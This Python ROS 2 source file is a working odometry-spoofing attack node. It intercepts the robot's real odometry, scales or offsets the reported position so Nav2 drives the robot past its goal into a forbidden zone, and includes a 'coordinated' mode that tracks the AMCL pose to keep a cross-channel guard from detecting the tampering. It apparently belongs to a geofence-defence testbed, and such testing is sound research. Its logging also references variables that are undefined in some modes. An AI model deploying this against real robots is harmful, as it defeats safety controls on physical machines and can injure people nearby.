#!/usr/bin/env python3
"""
Odometry Spoofing Attack Node (S4/S5 Attack)
=============================================

더 효과적인 공격: odom을 조작해서 Nav2를 속입니다.

공격 시나리오:
- 사용자가 "3m 앞으로 가" 명령
- Nav2가 odom 기반으로 현재 위치 추적
- 이 공격 노드가 odom을 조작: 실제보다 덜 갔다고 보고
- Nav2는 "아직 안 도착"이라고 착각하고 계속 전진
- 결과: 로봇이 6m 이동 → 금지구역 진입!

사용법:
    ros2 run geofence_policy_enforcer attack_odom_spoofing --ros-args \
        -p scale_factor:=0.5 \
        -p input_topic:=/odom_real \
        -p output_topic:=/odom

토픽 설정:
    실제 odom → odom_real → [이 노드] → odom (Nav2가 사용)
"""

import rclpy
from rclpy.node import Node
from nav_msgs.msg import Odometry
from std_msgs.msg import Bool, Float64
from geometry_msgs.msg import Pose, Twist, Point, Quaternion
from geometry_msgs.msg import PoseWithCovarianceStamped
import time
import math


class OdomSpoofingAttack(Node):
    """Odometry를 스푸핑하는 공격 노드"""

    def __init__(self):
        super().__init__('odom_spoofing_attack')

        # 파라미터 선언
        self.declare_parameter('scale_factor', 0.5)  # 위치를 실제의 50%로 보고
        self.declare_parameter('input_topic', '/odom_real')  # 실제 odom
        self.declare_parameter('output_topic', '/odom')  # Nav2가 사용하는 odom
        self.declare_parameter('attack_enabled', True)
        self.declare_parameter('spoof_position', True)  # 위치 스푸핑
        self.declare_parameter('spoof_velocity', False)  # 속도 스푸핑
        self.declare_parameter('offset_x', 0.0)  # x 오프셋 (미터)
        self.declare_parameter('offset_y', 0.0)  # y 오프셋 (미터)
        self.declare_parameter('log_interval', 1.0)
        # COORDINATED-ATTACK ramp mode: add a Δ(t) ramp offset synchronized with the LiDAR
        # spoof (same rate/cap/direction/delay) so the cross-channel offset c=amcl−odom is
        # held near a controlled residual ε. output = real_pose + [min(bias_max, rate·elapsed)
        # − coord_epsilon]·(cos,sin)(world_bias_angle). ε = the attacker's coordination error.
        self.declare_parameter('ramp_mode', False)
        self.declare_parameter('bias_rate', 0.20)          # m/s (match the LiDAR spoof)
        self.declare_parameter('bias_max', 4.5)            # cap (m)
        self.declare_parameter('world_bias_angle_deg', 90.0)
        self.declare_parameter('ramp_delay', 4.0)          # s before ramp begins (match delay)
        self.declare_parameter('coord_epsilon', 0.0)       # residual mismatch left in c (m)

        # 파라미터 읽기
        self.scale_factor = self.get_parameter('scale_factor').value
        input_topic = self.get_parameter('input_topic').value
        output_topic = self.get_parameter('output_topic').value
        self.attack_enabled = self.get_parameter('attack_enabled').value
        self.spoof_position = self.get_parameter('spoof_position').value
        self.spoof_velocity = self.get_parameter('spoof_velocity').value
        self.offset_x = self.get_parameter('offset_x').value
        self.offset_y = self.get_parameter('offset_y').value
        self.log_interval = self.get_parameter('log_interval').value
        import math as _m
        self.ramp_mode = self.get_parameter('ramp_mode').value
        self.bias_rate = self.get_parameter('bias_rate').value
        self.bias_max = self.get_parameter('bias_max').value
        self.world_bias_angle = _m.radians(self.get_parameter('world_bias_angle_deg').value)
        self.ramp_delay = self.get_parameter('ramp_delay').value
        self.coord_epsilon = self.get_parameter('coord_epsilon').value
        self._ramp_start = None
        # Coordinated attacker TRACKS the robot's published localization (amcl) and drives
        # odom to match it (minus ε), rather than open-loop ramping — otherwise the odom
        # ramp leads AMCL's lagged convergence and over-cancels (c flips sign → detected).
        self.declare_parameter('amcl_topic', '/amcl_pose')
        self._amcl_x = None
        self._amcl_y = None
        if self.ramp_mode:
            self.amcl_sub = self.create_subscription(
                PoseWithCovarianceStamped, self.get_parameter('amcl_topic').value,
                self._amcl_cb, 10)

        # 초기 위치 저장 (상대적 스케일링용)
        self.initial_pose = None
        self.last_log_time = 0.0
        self.total_msgs = 0

        # Publisher/Subscriber
        self.odom_pub = self.create_publisher(Odometry, output_topic, 10)
        self.odom_sub = self.create_subscription(
            Odometry, input_topic, self.odom_callback, 10)

        # 공격 상태 publish
        self.attack_status_pub = self.create_publisher(
            Bool, '/attack/odom_spoofing/active', 10)

        # 상태 타이머
        self.status_timer = self.create_timer(0.5, self.publish_status)

        # 시작 로그
        self.get_logger().warn('=' * 60)
        self.get_logger().warn('ODOMETRY SPOOFING ATTACK NODE STARTED')
        self.get_logger().warn('=' * 60)
        self.get_logger().warn(f'  Scale factor: {self.scale_factor}x (position appears closer)')
        self.get_logger().warn(f'  Input topic:  {input_topic}')
        self.get_logger().warn(f'  Output topic: {output_topic}')
        self.get_logger().warn(f'  Position spoofing: {self.spoof_position}')
        self.get_logger().warn(f'  Velocity spoofing: {self.spoof_velocity}')
        if self.offset_x != 0 or self.offset_y != 0:
            self.get_logger().warn(f'  Position offset: ({self.offset_x}, {self.offset_y})')
        self.get_logger().warn('=' * 60)
        self.get_logger().warn('Effect: Robot moves further than Nav2 thinks!')
        self.get_logger().warn('  scale=0.5 → Robot at 6m appears at 3m → continues moving')
        self.get_logger().warn('=' * 60)

    def _amcl_cb(self, msg):
        self._amcl_x = msg.pose.pose.position.x
        self._amcl_y = msg.pose.pose.position.y

    def odom_callback(self, msg: Odometry):
        """Odom 메시지를 받아서 스푸핑 후 전달"""
        self.total_msgs += 1
        current_time = time.time()

        # 초기 위치 저장
        if self.initial_pose is None:
            self.initial_pose = msg.pose.pose
            self.get_logger().info(
                f'Initial pose recorded: ({self.initial_pose.position.x:.2f}, '
                f'{self.initial_pose.position.y:.2f})')

        # 출력 메시지 생성
        out_msg = Odometry()
        out_msg.header = msg.header
        out_msg.child_frame_id = msg.child_frame_id

        if self.attack_enabled:
            # 현재 위치 (초기 위치 기준 상대 좌표)
            real_x = msg.pose.pose.position.x
            real_y = msg.pose.pose.position.y

            # 초기 위치 기준 이동 거리
            delta_x = real_x - self.initial_pose.position.x
            delta_y = real_y - self.initial_pose.position.y

            if self.ramp_mode:
                # COORDINATED: drive odom to TRACK the robot's published amcl pose (minus ε
                # along the displacement direction), so the guard's c=amcl−odom holds at ~ε.
                # Tracking amcl (not an open-loop ramp) avoids over/under-cancelling AMCL's
                # lagged convergence. Falls back to passthrough until amcl is seen.
                import math as _m
                if self._amcl_x is not None:
                    ux = _m.cos(self.world_bias_angle)
                    uy = _m.sin(self.world_bias_angle)
                    out_msg.pose.pose.position.x = self._amcl_x - self.coord_epsilon * ux
                    out_msg.pose.pose.position.y = self._amcl_y - self.coord_epsilon * uy
                    out_msg.pose.pose.position.z = msg.pose.pose.position.z
                    if current_time - self.last_log_time > self.log_interval:
                        cx = self._amcl_x - out_msg.pose.pose.position.x
                        cy = self._amcl_y - out_msg.pose.pose.position.y
                        self.get_logger().warn(
                            f'[ODOM-COORD] track amcl=({self._amcl_x:.2f},{self._amcl_y:.2f}) '
                            f'ε={self.coord_epsilon:.2f} residual c=({cx:.2f},{cy:.2f})')
                        self.last_log_time = current_time
                else:
                    out_msg.pose.pose.position = msg.pose.pose.position
            elif self.spoof_position:
                # 위치 스케일링: 실제로 6m 갔는데 3m만 간 것처럼
                spoofed_x = self.initial_pose.position.x + (delta_x * self.scale_factor) + self.offset_x
                spoofed_y = self.initial_pose.position.y + (delta_y * self.scale_factor) + self.offset_y

                out_msg.pose.pose.position.x = spoofed_x
                out_msg.pose.pose.position.y = spoofed_y
                out_msg.pose.pose.position.z = msg.pose.pose.position.z
            else:
                out_msg.pose.pose.position = msg.pose.pose.position

            # orientation은 그대로 (회전은 스푸핑 안함)
            out_msg.pose.pose.orientation = msg.pose.pose.orientation
            out_msg.pose.covariance = msg.pose.covariance

            if self.spoof_velocity:
                # 속도도 스케일링 (선택적)
                out_msg.twist.twist.linear.x = msg.twist.twist.linear.x * self.scale_factor
                out_msg.twist.twist.linear.y = msg.twist.twist.linear.y * self.scale_factor
                out_msg.twist.twist.linear.z = msg.twist.twist.linear.z
                out_msg.twist.twist.angular = msg.twist.twist.angular
            else:
                out_msg.twist = msg.twist

            out_msg.twist.covariance = msg.twist.covariance

            # 주기적 로그
            if current_time - self.last_log_time > self.log_interval:
                if abs(delta_x) > 0.1 or abs(delta_y) > 0.1:
                    self.get_logger().warn(
                        f'[SPOOF] Real: ({real_x:.2f}, {real_y:.2f}) → '
                        f'Spoofed: ({spoofed_x:.2f}, {spoofed_y:.2f})')
                self.last_log_time = current_time
        else:
            # 공격 비활성: 원본 그대로
            out_msg = msg

        self.odom_pub.publish(out_msg)

    def publish_status(self):
        """공격 상태 publish"""
        status_msg = Bool()
        status_msg.data = self.attack_enabled
        self.attack_status_pub.publish(status_msg)


def main(args=None):
    rclpy.init(args=args)
    node = OdomSpoofingAttack()

    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        node.get_logger().info('Odom spoofing attack shutting down...')
        node.get_logger().info(f'Stats: {node.total_msgs} messages processed')
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
